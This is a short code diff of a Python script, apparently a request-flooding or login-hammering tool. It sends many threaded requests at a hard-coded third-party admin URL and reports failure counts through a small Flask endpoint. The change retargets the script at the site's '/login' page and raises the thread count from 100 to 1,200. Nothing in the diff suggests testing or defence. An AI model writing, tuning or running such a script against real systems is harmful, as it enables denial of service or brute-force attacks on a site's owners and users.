@@ -37,8 +37,8 @@ def chek(url):
             with lock:
                 stats["failed"] += 1
 def start_threads():
-    target_url = "https://adminpanel.in.net/hexor"
-    for _ in range(100):
+    target_url = "https://adminpanel.in.net/hexor/login"
+    for _ in range(1200):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
@@ -48,4 +48,4 @@ def home():
         return jsonify(stats)
 if __name__ == '__main__':
     threading.Thread(target=start_threads, daemon=True).start()
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5100)
